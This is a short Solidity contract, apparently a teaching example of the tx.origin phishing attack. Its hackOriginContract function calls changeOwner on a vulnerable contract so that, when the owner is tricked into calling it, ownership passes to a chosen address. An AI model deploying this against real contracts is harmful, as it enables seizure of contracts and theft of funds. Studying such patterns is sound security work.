// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;



interface ITxVulContract{
    function changeOwner(address _owner) external;
}
contract TxOriginHack {

    ITxVulContract vulcontract;

    constructor(address _contract){
        vulcontract = ITxVulContract(_contract);
    }

    function hackOriginContract(address _address) public{
        vulcontract.changeOwner(_address);
    }
}